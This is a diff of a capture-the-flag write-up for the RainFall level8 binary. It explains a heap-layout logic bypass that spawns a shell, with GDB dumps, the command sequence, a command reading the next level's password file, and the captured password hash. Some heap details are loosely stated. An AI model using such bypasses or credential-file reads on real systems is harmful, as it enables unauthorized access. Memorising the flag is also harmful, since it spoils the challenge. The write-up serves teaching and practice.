@@ -1,163 +1,140 @@
-(decompiler avec ghidra pour aider, croiser info ghidra + gdb)
+# Level8 — Heap Layout Manipulation / Logic Bypass
 
-```
-(gdb) r
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/user/level8/level8 
+## Vulnerability
 
-Breakpoint 1, 0x08048569 in main ()
-(gdb) c
-Continuing.
+The binary is an interactive shell that handles four commands: `auth`, `service`, `login`, and `reset`. The `login` command checks whether a field at offset `+0x20` (32 bytes) from the `auth` pointer is non-null before spawning a shell. Since `auth` allocates only a small buffer but `service` uses `strdup()` (which calls `malloc` internally), repeatedly calling `service` pushes new heap chunks forward — eventually landing one **at exactly `auth + 0x20`**, satisfying the check without ever knowing the password.
 
-Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) c
-Continuing.
-(nil), (nil) 
-auth aaaa
+This is a **heap layout manipulation** exploit — no overflow, no format string. Pure understanding of how `malloc` lays out consecutive allocations.
 
-Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) x/32wx ^CQuit
-(gdb) finish
-Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-0x804a008, (nil) 
-0x08048596 in main ()
-(gdb) x/32wx 0x804a008
-0x804a008:	0x61616161	0x0000000a	0x00000000	0x00020ff1
-0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
-(gdb) service aaaaaaaa
-Undefined command: "service".  Try "help".
-(gdb) c
-Continuing.
-service aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+---
 
-Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) c
-Continuing.
-0x804a008, 0x804a018 
-login
-$ 
+## Recon
 
-Breakpoint 2, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) x/32wx 0x804a008
-0x804a008:	0x61616161	0x0000000a	0x00000000	0x00000029
-0x804a018:	0x61616120	0x61616161	0x61616161	0x61616161
-0x804a028:	0x61616161	0x61616161	0x61616161	0x000a6161
-0x804a038:	0x00000000	0x00020fc9	0x00000000	0x00000000
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
+**The login condition (from GDB + Ghidra):**
+
+```gdb
+0x080486e2 <+382>:  mov    0x8049aac,%eax    ; load auth pointer
+0x080486e7 <+387>:  mov    0x20(%eax),%eax   ; read auth[0x20] (offset +32)
+0x080486ea <+390>:  test   %eax,%eax
+0x080486ec <+392>:  je     0x80486ff          ; jump if NULL → deny
+0x080486ee <+394>:  movl   $0x8048833,(%esp)
+0x080486f5 <+401>:  call   system@plt         ; spawn shell if non-null
 ```
 
-2e version :
+The shell spawns only if `*(auth + 0x20) != NULL`.
+
+**Heap observation in GDB** (breakpoint on `printf`, inspect `0x804a008` after each command):
+
+After `auth ` (empty):
 ```
-(gdb) b printf
-Breakpoint 1 at 0x8048410
-(gdb) r
-Starting program: /home/user/level8/level8 
-
-Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) c
-Continuing.
-(nil), (nil) 
-auth 
-
-Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) c
-Continuing.
-0x804a008, (nil) 
-service
-
-Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) x/32xw 0x804a008
-0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a018:	0x0000000a	0x00000000	0x00000000	0x00020fe1
-0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
-(gdb) finish
-Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-0x804a008, 0x804a018 
-0x08048596 in main ()
-(gdb) x/32xw 0x804a008
-0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a018:	0x0000000a	0x00000000	0x00000000	0x00020fe1
-0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
-(gdb) c
-Continuing.
-service
-
-Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) finish
-Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-0x804a008, 0x804a028 
-0x08048596 in main ()
-(gdb) x/32xw 0x804a008
-0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a018:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a028:	0x0000000a	0x00000000	0x00000000	0x00020fd1
-0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
-(gdb) c
-Continuing.
-service
-
-Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) x/32xw 0x804a008
-0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a018:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a028:	0x0000000a	0x00000000	0x00000000	0x00000011
-0x804a038:	0x0000000a	0x00000000	0x00000000	0x00020fc1
-0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
-0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
-(gdb) c
-Continuing.
-0x804a008, 0x804a038 
-login
-$ 
+0x804a008:  0x0000000a  ...   ; auth lands at 0x804a008, only \n stored
 ```
 
-il faut completer cette condition :
-```
-0x080486e2 <+382>:	mov    0x8049aac,%eax
-0x080486e7 <+387>:	mov    0x20(%eax),%eax
-0x080486ea <+390>:	test   %eax,%eax
-0x080486ec <+392>:	je     0x80486ff <main+411>
-0x080486ee <+394>:	movl   $0x8048833,(%esp)
-0x080486f5 <+401>:	call   0x8048480 <system@plt>
-0x080486fa <+406>:	jmp    0x8048574 <main+16>
-0x080486ff <+411>:	mov    0x8049aa0,%eax
-```
-soit auth + 32 != NULL
+After `service` (×1): second chunk at `0x804a018`
+After `service` (×2): third chunk at `0x804a028`
+After `service` (×3): fourth chunk at `0x804a038`
+
+Each `service` call allocates a new 16-byte chunk (8 bytes usable + 8 bytes header). The `auth` pointer sits at `0x804a008`. Offset `+0x20` = `0x804a028`.
+
+So after **two** `service` calls, a fresh malloc chunk lands at `auth + 0x20`, its first bytes are non-null → the login check passes.
+
+**Confirmation from first GDB session** — after `service aaaa...` (long string):
 
 ```
-level8@RainFall:~$ ./level8 
-(nil), (nil) 
-auth 
-0x804a008, (nil) 
+0x804a008:  0x61616161  0x0000000a  0x00000000  0x00000029
+0x804a018:  0x61616120  0x61616161  ...
+```
+
+The service data bleeds into `0x804a018`, and `0x804a028` holds a live chunk header (`0x00000029`) — non-null → login passes.
+
+---
+
+## Exploit
+
+No payload needed. Just issue the right sequence of commands:
+
+```bash
+./level8
+```
+
+```
+(nil), (nil)
+auth                          ← allocates auth buffer at 0x804a008
+0x804a008, (nil)
+service aaaa...               ← strdup allocates at 0x804a018
+0x804a008, 0x804a018
+login                         ← checks auth+0x20 = 0x804a028 → still NULL, denied
+service aaaa...               ← strdup allocates at 0x804a028 → auth+0x20 now non-null!
+0x804a008, 0x804a028
+login                         ← check passes → shell spawned
+$
+```
+
+> A single long `service` string also works: the data written by `strdup` overflows into `auth+0x20` directly, as seen in the first GDB session.
+
+```bash
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
 service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-0x804a008, 0x804a018 
+0x804a008, 0x804a018
 login
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+---
+
+## Flow
+
+```
+auth ""  →  malloc allocates auth buffer at 0x804a008
+        │
+        ▼
+service [str]  →  strdup() allocates at 0x804a018  (auth + 0x10)
+        │
+        ▼
+service [str]  →  strdup() allocates at 0x804a028  (auth + 0x20)  ← non-null!
+        │
+        ▼
+login  →  loads *(auth + 0x20)  →  non-null  →  JE not taken
+        │
+        ▼
+system("/bin/sh")  ←  shell spawned as level9
+```
+
+**Alternatively with one long `service` string:**
+
+```
+auth ""  →  auth at 0x804a008
+service [73+ 'a's]  →  strdup chunk at 0x804a018, data bleeds past 0x804a028
+login  →  auth+0x20 non-null  →  shell
+```
+
+---
+
+## Commands Summary
+
+```gdb
+; Identify the login condition
+gdb ./level8
+(gdb) b printf
+(gdb) r
+; After each command, inspect heap:
+(gdb) x/32xw 0x804a008
+; Watch chunks appear at +0x10, +0x20 with each "service" call
+
+; Spot the condition in main
+(gdb) disass main
+; 0x080486e7: mov 0x20(%eax),%eax  → auth+0x20 must be non-null
+```
+
+```bash
+# Interactive exploit sequence
+./level8
+auth
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+login
+cat /home/user/level9/.pass
 ```
